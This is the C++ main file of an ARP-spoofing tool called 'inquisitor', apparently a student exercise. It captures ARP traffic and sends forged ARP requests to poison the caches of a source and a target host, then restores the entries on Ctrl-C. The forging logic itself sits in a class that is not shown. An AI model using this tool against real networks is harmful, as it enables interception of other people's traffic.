#include <iostream>
#include <pcap/pcap.h>
#include <Pcap.hpp>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <iomanip>
#include <csignal>
#include "ft_macros.hpp"

/*
 * To free ARP table
 */
int g_free_arp = 0;
/*
 * Mandatory global
 */
pcap_t *g_device = NULL;

/*
 * 0 == normal capture
 * 1 == retrieve capture
 */
void	signal_handler(int sig) {
	if (sig == SIGINT) {
		if (g_free_arp == 0) {
			g_free_arp = 1;
			if (g_device) {
				pcap_breakloop(g_device);
			}
		}
		std::cout << "STOP, restoring multiplexing arps" << std::endl;
	}
}

/*
 * Who has target? tell poison
 */
int poison_request(Pcap &c_pcap, bool recover) {
	c_pcap.forgePacketRequest(recover);
	c_pcap.sendPacket();
	c_pcap.forgePacketRequestSrc(recover);
	c_pcap.sendPacket();
	return 0;
}

int loop_filter(Pcap &c_pcap) {
	pcap_t *device = c_pcap.GetDeviceCapture();
	if (!device)
		return 1;
	int res = c_pcap.setSelfMac();

	if (res) {
		if (res == PCAP_ERROR)
			std::cerr << "No device found" << std::endl;
		std::cout << "res error << std::endl;" << std::endl;
		return 1;
	}
	poison_request(c_pcap, false);
	g_device = device;
	std::signal(SIGINT, signal_handler);
	return c_pcap.loopPcap(device);
}

int start_capture(Pcap &c_pcap) {
	char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	pcap_t	*device_capture = NULL;
	int	error;
	struct bpf_program *fp = NULL;

	try {
		c_pcap.SetDeviceCapture(c_pcap.getInterface());
		device_capture = c_pcap.GetDeviceCapture();
		if (!device_capture) {
			std::cerr << "Couldn't get device for capture." << std::endl;
			return 1;
		}
		error = c_pcap.setTimeout(device_capture, 100);
		if (error == PCAP_ERROR_ACTIVATED) {
			std::cerr << "Capture already activated." << std::endl;
			return 1;
		}
		error = c_pcap.activateCapture();
		if (error != 0) {
			std::cerr << pcap_statustostr(error) << std::endl;
			return 1;
		}
		if (error == PCAP_ERROR) {
			std::cout << errbuf << std::endl;;
			return 1;
		}
		//filter ask activate before
		error = c_pcap.compileFilterArp(device_capture);
		if (error != 0) {
			pcap_perror(c_pcap.GetDeviceCapture(),
				"Compile filter failed");
			return 1;
		}
		fp = c_pcap.getBpf();
		if (!fp) {
			std::cerr << "Couldn't get Bpf." << std::endl;
			return 1;
		}
		error = c_pcap.setFilter(device_capture, fp);
		if (error != 0) {
			pcap_perror(c_pcap.GetDeviceCapture(),
				"Set filter failed");
			return 1;
		
		}
		return loop_filter(c_pcap);
	} catch (std::runtime_error& err) {
		std::cerr << "Runtime: " << err.what() << std::endl;
		return 1;
	} catch (std::bad_alloc& err) {
		std::cerr << "Bad alloc: " << err.what() << std::endl;
		return 1;
	} catch (std::exception& err) {
		std::cerr << "Exception: " << err.what() << std::endl;
		return 1;
	}
}

int main(int argc, char *argv[]) {
	if (!(argc >= 5 && argc <= 6)) {
		std::cout << "Please provide ./inquisitor <ip_src>" \
			<< " <MAC_src> <ip_target> <MAC_target> <optional_interface_name> command." << std::endl;
		return 1;
	}
	std::string interface("eth0");
	char errbuf[PCAP_ERRBUF_SIZE];
	int res = pcap_init(PCAP_CHAR_ENC_LOCAL, errbuf);

	if (res) {
		if (res == PCAP_ERROR) {
			std::cerr << errbuf << std::endl;
		}
		return 1;
	}
	if (argc == 6)
		interface = argv[5];
	else {
		std::cout << "Default interface " << interface << std::endl;
	}
	Pcap c_pcap(argv[1], argv[2], argv[3]
		, argv[4], interface);
	res = start_capture(c_pcap);
	return res;
}
